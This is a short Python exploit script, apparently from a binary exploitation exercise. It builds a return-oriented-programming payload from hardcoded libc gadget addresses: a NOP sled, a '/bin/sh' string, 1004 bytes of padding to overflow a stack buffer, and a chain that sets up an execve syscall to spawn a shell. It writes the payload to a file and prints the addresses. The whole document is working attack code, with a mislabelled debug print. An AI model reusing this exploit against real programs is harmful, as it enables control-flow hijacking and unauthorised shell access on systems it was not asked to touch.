#!/usr/bin/python

import struct

import binascii

#max 0x195000 of offset
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
d2 = 0x00
d3 = 0x00
g3 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
d4 = 0x7fffffffe154 #address of /bin/sh on the stack
retStringRev = 0x0068732f6e69622f
g4 = 0x7ffff7b9476b #syscall

# removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
shellcode =''
for i in range(1,37) :
    shellcode += '\x90'
# shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
# shellcode += struct.pack('<p',"'/bin/sh',0")
shellcode += struct.pack('<q', retStringRev)
shellcode += 'A'*(1004)
shellcode += struct.pack('<q', g1)#pop rax ; ret
shellcode += struct.pack('<q', d1) #59
shellcode += struct.pack('<q', g2)#pop rdx + rsi
shellcode += struct.pack('<q', d2) #0
shellcode += struct.pack('<q', d3)# 0
shellcode += struct.pack('<q', g3)# pop rdi
shellcode += struct.pack('<q', d4) #address to /bin/sh string
shellcode += struct.pack('<q', g4) #syscall

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))
print ("d1: %x" % (d1))
print ("g2: %x" % (g2))
print ("d2: %x" % (d2))
print ("d3: %x" % (d3))
print ("g4: %x" % (g3))
print ("d6: %x" % (d4))
print ("g5: %x" % (g4))
print ("ret in buffer: %x" % (retStringRev))